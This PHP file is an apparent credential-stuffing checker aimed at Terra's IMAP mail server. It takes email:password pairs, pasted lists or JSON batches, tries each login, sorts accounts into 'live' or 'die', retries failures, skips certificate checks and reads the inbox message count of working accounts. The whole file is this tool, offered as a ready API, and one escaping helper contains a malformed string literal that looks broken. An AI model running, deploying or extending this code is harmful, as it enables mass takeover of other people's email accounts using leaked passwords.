<?php
/**
 * api.php — Validador IMAP Terra (versão definitiva)
 * Múltiplos métodos de conexão + diagnóstico integrado
 */
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');

class TerraValidator {
    private array $config;
    private array $diag = [];

    public function __construct() {
        $this->config = [
            'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 30),
            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 2),
            'validate_cert' => false,
        ];
    }

    // ════════════════════════════════════════════════════════
    //  API PÚBLICA
    // ════════════════════════════════════════════════════════

    public function validate(string $email, string $password): array {
        $attempt  = 0;
        $last_err = '';
        $start    = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $this->diag = [];

            try {
                $result = $this->attemptLogin($email, $password);

                if ($result['status'] === 'live') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                $last_err = $result['message'] ?? 'Erro desconhecido';

                if (($result['reason'] ?? '') === 'invalid_credentials') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                if (!($result['retryable'] ?? false)) {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }
            } catch (\Throwable $e) {
                $last_err = $e->getMessage();
                $this->diag[] = 'Throwable: ' . $last_err;
            }

            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 1000000));
            }
        }

        return [
            'status'      => 'die',
            'email'       => $email,
            'attempts'    => $attempt,
            'last_error'  => $last_err,
            'reason'      => 'max_retries_exceeded',
            'elapsed_ms'  => round((microtime(true) - $start) * 1000, 2),
            'diagnostics' => $this->diag,
            'timestamp'   => date('Y-m-d H:i:s'),
        ];
    }

    public function validateBatch(array $credentials): array {
        $results = [];
        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';

            if ($email === '' || $password === '') {
                $results[] = [
                    'email'   => $email,
                    'status'  => 'error',
                    'message' => 'Email ou senha ausentes',
                ];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }

        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    public function diagnostic(): array {
        $result = [
            'server'  => $this->config['imap_server'],
            'port'    => $this->config['imap_port'],
            'timeout' => $this->config['timeout'],
            'php_ver' => PHP_VERSION,
            'ssl_ext' => extension_loaded('openssl') ? 'yes' : 'NO',
            'sockets' => function_exists('fsockopen') ? 'yes' : 'NO',
            'tests'   => [],
        ];

        // ── Teste 1: DNS ──
        $t1 = microtime(true);
        $ips = @gethostbynamel($this->config['imap_server']);
        $result['tests']['dns'] = [
            'ok'         => !empty($ips),
            'ips'        => $ips ?: [],
            'elapsed_ms' => round((microtime(true) - $t1) * 1000, 2),
        ];
        if (empty($ips)) {
            $result['tests']['dns']['error'] = 'DNS não resolveu';
            return $result;
        }

        // ── Teste 2: TCP bruto (fsockopen) ──
        $t2 = microtime(true);
        $tcp = @fsockopen($ips[0], $this->config['imap_port'], $errno, $errstr, $this->config['timeout']);
        $result['tests']['tcp_raw'] = [
            'ok'         => $tcp !== false,
            'elapsed_ms' => round((microtime(true) - $t2) * 1000, 2),
        ];
        if ($tcp === false) {
            $result['tests']['tcp_raw']['error'] = "errno={$errno}; {$errstr}";
            $result['tests']['tcp_raw']['hint']  = 'Porta 993 pode estar bloqueada pelo Render (free tier bloqueia outbound não-HTTP)';
        } else {
            fclose($tcp);
        }

        // ── Teste 3: SSL via fsockopen ──
        $t3 = microtime(true);
        $ssl = @fsockopen('ssl://' . $this->config['imap_server'], $this->config['imap_port'], $errno3, $errstr3, $this->config['timeout']);
        $result['tests']['ssl_fsockopen'] = [
            'ok'         => $ssl !== false,
            'elapsed_ms' => round((microtime(true) - $t3) * 1000, 2),
        ];
        if ($ssl === false) {
            $result['tests']['ssl_fsockopen']['error'] = "errno={$errno3}; {$errstr3}";
        } else {
            stream_set_timeout($ssl, $this->config['timeout']);
            $greeting1 = @fgets($ssl, 8192);
            $result['tests']['ssl_fsockopen']['greeting'] = $greeting1 ?: '(vazio)';
            $result['tests']['ssl_fsockopen']['imap_ok']  = ($greeting1 && stripos($greeting1, 'OK') !== false);
            fclose($ssl);
        }

        // ── Teste 4: SSL via stream_socket_client ──
        $t4 = microtime(true);
        $ctx = stream_context_create([
            'ssl' => [
                'verify_peer'       => false,
                'verify_peer_name'  => false,
                'allow_self_signed' => true,
            ],
        ]);
        $remote = 'ssl://' . $this->config['imap_server'] . ':' . $this->config['imap_port'];
        $stream = @stream_socket_client($remote, $errno4, $errstr4, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);
        $result['tests']['ssl_stream'] = [
            'ok'         => $stream !== false,
            'elapsed_ms' => round((microtime(true) - $t4) * 1000, 2),
        ];
        if ($stream === false) {
            $result['tests']['ssl_stream']['error'] = "errno={$errno4}; {$errstr4}";
        } else {
            stream_set_timeout($stream, $this->config['timeout']);
            $greeting2 = @fgets($stream, 8192);
            $result['tests']['ssl_stream']['greeting'] = $greeting2 ?: '(vazio)';
            $result['tests']['ssl_stream']['imap_ok']  = ($greeting2 && stripos($greeting2, 'OK') !== false);
            fclose($stream);
        }

        // ── Teste 5: TLS via stream_socket_client ──
        $t5 = microtime(true);
        $remote_tls = 'tls://' . $this->config['imap_server'] . ':' . $this->config['imap_port'];
        $stream2 = @stream_socket_client($remote_tls, $errno5, $errstr5, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);
        $result['tests']['tls_stream'] = [
            'ok'         => $stream2 !== false,
            'elapsed_ms' => round((microtime(true) - $t5) * 1000, 2),
        ];
        if ($stream2 === false) {
            $result['tests']['tls_stream']['error'] = "errno={$errno5}; {$errstr5}";
        } else {
            stream_set_timeout($stream2, $this->config['timeout']);
            $greeting3 = @fgets($stream2, 8192);
            $result['tests']['tls_stream']['greeting'] = $greeting3 ?: '(vazio)';
            $result['tests']['tls_stream']['imap_ok']  = ($greeting3 && stripos($greeting3, 'OK') !== false);
            fclose($stream2);
        }

        // ── Resumo ──
        $any_ok = false;
        foreach (['ssl_fsockopen', 'ssl_stream', 'tls_stream'] as $test) {
            if ($result['tests'][$test]['ok'] ?? false) {
                $any_ok = true;
                break;
            }
        }
        $result['can_connect'] = $any_ok;
        $result['blocked_port'] = !$any_ok && !($result['tests']['tcp_raw']['ok'] ?? false);

        return $result;
    }

    // ════════════════════════════════════════════════════════
    //  AUTENTICAÇÃO — TENTA MÚLTIPLOS MÉTODOS
    // ════════════════════════════════════════════════════════

    private function attemptLogin(string $email, string $password): array {
        // Tenta método 1: fsockopen + ssl://
        $socket = $this->connectFsockopenSSL();

        // Tenta método 2: stream_socket_client + ssl://
        if ($socket === null) {
            $socket = $this->connectStreamSSL();
        }

        // Tenta método 3: stream_socket_client + tls://
        if ($socket === null) {
            $socket = $this->connectStreamTLS();
        }

        // Todos falharam
        if ($socket === null) {
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha de conexão — todos os métodos falharam',
                'reason'    => 'connection_error',
                'retryable' => true,
            ];
        }

        // ── Greeting IMAP ──
        $greeting = @fgets($socket, 8192);

        if ($greeting === false || $greeting === '') {
            fclose($socket);
            $this->diag[] = 'Greeting vazio';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta do servidor',
                'reason'    => 'empty_greeting',
                'retryable' => true,
            ];
        }

        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = 'Greeting sem OK: ' . trim($greeting);
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Servidor não respondeu OK',
                'reason'       => 'bad_greeting',
                'retryable'    => false,
                'error_detail' => trim($greeting),
            ];
        }
        $this->diag[] = 'Greeting OK: ' . trim($greeting);

        // ── LOGIN ──
        $tag = 'A001';
        $safe_email = $this->escapeImapString($email);
        $safe_pass  = $this->escapeImapString($password);
        $cmd = "{$tag} LOGIN {$safe_email} {$safe_pass}\r\n";

        $written = fwrite($socket, $cmd);
        if ($written === false) {
            fclose($socket);
            $this->diag[] = 'Falha ao enviar LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha ao enviar comando',
                'reason'    => 'write_error',
                'retryable' => true,
            ];
        }
        $this->diag[] = "LOGIN enviado ({$written} bytes)";

        // ── Ler resposta ──
        $response = $this->readUntilTag($socket, $tag);
        $meta     = stream_get_meta_data($socket);

        if ($response === null || $response === '') {
            fclose($socket);
            $this->diag[] = 'Resposta nula';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta após LOGIN',
                'reason'    => 'empty_response',
                'retryable' => true,
            ];
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $this->diag[] = 'Timeout no LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Timeout após LOGIN',
                'reason'    => 'timeout',
                'retryable' => true,
            ];
        }

        $this->diag[] = 'Resposta: ' . trim($response);

        // ── Analisar ──
        $qt = preg_quote($tag, '/');

        // OK
        if (preg_match('/' . $qt . '\s+OK/i', $response)) {
            $msgs = $this->tryMessageCount($socket);
            fwrite($socket, "A002 LOGOUT\r\n");
            fclose($socket);

            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'Autenticação bem-sucedida',
                'mailbox_messages' => $msgs,
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        // NO
        if (preg_match('/' . $qt . '\s+NO/i', $response)) {
            fclose($socket);
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Invalid credentials',
                'reason'       => 'invalid_credentials',
                'retryable'    => false,
                'error_detail' => $this->cleanImapResponse($response, $tag),
            ];
        }

        // BAD
        if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
            fclose($socket);
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Comando rejeitado',
                'reason'       => 'bad_command',
                'retryable'    => false,
                'error_detail' => $this->cleanImapResponse($response, $tag),
            ];
        }

        fclose($socket);
        return [
            'status'       => 'die',
            'email'        => $email,
            'message'      => 'Resposta inesperada',
            'reason'       => 'unexpected',
            'retryable'    => true,
            'error_detail' => trim($response),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  MÉTODOS DE CONEXÃO
    // ════════════════════════════════════════════════════════

    /**
     * Método 1: fsockopen com ssl://
     */
    private function connectFsockopenSSL(): ?object {
        $remote = 'ssl://' . $this->config['imap_server'] . ':' . $this->config['imap_port'];
        $socket = @fsockopen($remote, $this->config['imap_port'], $errno, $errstr, $this->config['timeout']);

        if ($socket === false) {
            $this->diag[] = "fsockopen(ssl://) falhou: errno={$errno} errstr={$errstr}";
            return null;
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $this->diag[] = 'Conectado via fsockopen(ssl://)';
        return $socket;
    }

    /**
     * Método 2: stream_socket_client com ssl://
     */
    private function connectStreamSSL(): ?object {
        $remote  = 'ssl://' . $this->config['imap_server'] . ':' . $this->config['imap_port'];
        $context = stream_context_create([
            'ssl' => [
                'verify_peer'       => false,
                'verify_peer_name'  => false,
                'allow_self_signed' => true,
            ],
        ]);

        $socket = @stream_socket_client(
            $remote,
            $errno,
            $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT,
            $context
        );

        if ($socket === false) {
            $this->diag[] = "stream_socket_client(ssl://) falhou: errno={$errno} errstr={$errstr}";
            return null;
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $this->diag[] = 'Conectado via stream_socket_client(ssl://)';
        return $socket;
    }

    /**
     * Método 3: stream_socket_client com tls://
     */
    private function connectStreamTLS(): ?object {
        $remote  = 'tls://' . $this->config['imap_server'] . ':' . $this->config['imap_port'];
        $context = stream_context_create([
            'ssl' => [
                'verify_peer'       => false,
                'verify_peer_name'  => false,
                'allow_self_signed' => true,
            ],
        ]);

        $socket = @stream_socket_client(
            $remote,
            $errno,
            $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT,
            $context
        );

        if ($socket === false) {
            $this->diag[] = "stream_socket_client(tls://) falhou: errno={$errno} errstr={$errstr}";
            return null;
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $this->diag[] = 'Conectado via stream_socket_client(tls://)';
        return $socket;
    }

    // ════════════════════════════════════════════════════════
    //  HELPERS
    // ════════════════════════════════════════════════════════

    private function escapeImapString(string $str): string {
        $escaped = str_replace(['\', '"'], ['\\', '\"'], $str);
        return '"' . $escaped . '"';
    }

    private function readUntilTag($socket, string $tag): ?string {
        $buffer   = '';
        $deadline = microtime(true) + $this->config['timeout'];

        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) {
                break;
            }
            $buffer .= $line;

            if (strpos(trim($line), $tag . ' ') === 0) {
                return $buffer;
            }

            $meta = stream_get_meta_data($socket);
            if (!empty($meta['timed_out'])) {
                break;
            }

            if (microtime(true) > $deadline) {
                break;
            }
        }

        return $buffer !== '' ? $buffer : null;
    }

    private function cleanImapResponse(string $response, string $tag): string {
        $lines = explode("\r\n", $response);
        foreach (array_reverse($lines) as $line) {
            $line = trim($line);
            if ($line !== '' && strpos($line, $tag . ' ') === 0) {
                return preg_replace(
                    '/^' . preg_quote($tag, '/') . '\s+(OK|NO|BAD)\s*/i',
                    '',
                    $line
                );
            }
        }
        return trim($response);
    }

    private function tryMessageCount($socket): int {
        $tag = 'S001';
        fwrite($socket, "{$tag} STATUS INBOX (MESSAGES)\r\n");
        $resp = $this->readUntilTag($socket, $tag);

        if ($resp !== null && preg_match('/MESSAGES\s+(\d+)/i', $resp, $m)) {
            return (int)$m[1];
        }
        return 0;
    }
}

// ════════════════════════════════════════════════════════════════
//  ROTEAMENTO
// ════════════════════════════════════════════════════════════════

$action = $_GET['action'] ?? '';
$validator = new TerraValidator();

// ── Diagnóstico ──
if ($action === 'diagnostic') {
    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ── Checagem ──
if ($action === 'check' || $action === '') {
    $input = $_POST;
    $ct = $_SERVER['CONTENT_TYPE'] ?? '';

    if (empty($input) && stripos($ct, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $input = $decoded;
            }
        }
    }

    $email    = $input['email']    ?? '';
    $password = $input['password'] ?? '';
    $batch    = $input['batch']    ?? null;

    // Formato cred
    if ($email === '' && !empty($input['cred'])) {
        $parts = explode(':', $input['cred'], 2);
        if (count($parts) === 2) {
            $email    = trim($parts[0]);
            $password = trim($parts[1]);
        }
    }

    // Formato list
    if ($email === '' && empty($batch) && !empty($input['list'])) {
        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
        $batch = [];
        foreach ($lines as $line) {
            $parts = explode(':', $line, 2);
            if (count($parts) === 2) {
                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    if ($batch && is_array($batch) && count($batch) > 0) {
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif ($email !== '' && $password !== '') {
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'error' => 'Credenciais ausentes',
            'usage' => [
                'json'  => 'POST {"email":"user@terra.com.br","password":"senha"}',
                'form'  => 'POST email=user@terra.com.br&password=senha',
                'cred'  => 'POST cred=user@terra.com.br:senha',
                'batch' => 'POST {"batch":[{"email":"...","password":"..."}]}',
            ],
            'diagnostic' => 'GET /api.php?action=diagnostic',
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    exit;
}

http_response_code(404);
echo json_encode(['error' => 'Action desconhecida: ' . $action], JSON_UNESCAPED_UNICODE);
